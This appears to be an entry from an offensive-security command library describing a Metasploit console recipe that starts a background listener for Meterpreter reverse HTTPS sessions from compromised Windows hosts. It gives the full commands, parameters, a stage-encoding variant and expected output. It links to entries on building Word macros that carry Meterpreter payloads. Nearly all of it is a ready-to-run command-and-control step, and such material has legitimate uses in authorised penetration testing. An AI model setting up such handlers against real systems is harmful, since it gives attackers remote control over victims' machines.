---
id: 6b7d9c1e-797f-4f5a-a55f-7ef21376cb8d
name: start-meterpreter-reverse-https-handler
type: command
executor: msfconsole
data: |-
  use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_https
  set LHOST 0.0.0.0
  set LPORT 4646
  set ExitOnSession false
  exploit -j -z
output: null
created_at: '2023-04-06T03:56:21.645240+00:00'
updated_at: '2023-04-10T20:25:01.012583+00:00'
platforms:
  - Linux
tags:
  - metasploit
  - c2
  - handler
verified: true
validated: true
---

# start-meterpreter-reverse-https-handler

## Command

```msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```

## Description

Sets up a Metasploit handler to listen for incoming Meterpreter reverse HTTPS connections from compromised Windows hosts. Runs in background (-j) without interaction (-z).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `LHOST` | Local host to bind (0.0.0.0 for all interfaces) | Yes |
| `LPORT` | Listening port | Yes |
| `ExitOnSession` | Keeps handler running after session opens | Yes |
| `-j -z` | Background and non-interactive execution | Yes |

## Examples

### Basic Usage

```msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z
```

### Advanced Usage

```msfconsole
set EnableStageEncoding true
exploit -j
```

## Expected Output

[*] Started reverse HTTPS handler on 0.0.0.0:4646

## Related

- [[commands/generate-office-word-macro-with-meterpreter-payload]]
- [[procedures/Metasploit-Scripting-with-Meterpreter-Reverse-HTTPS-Payload]]
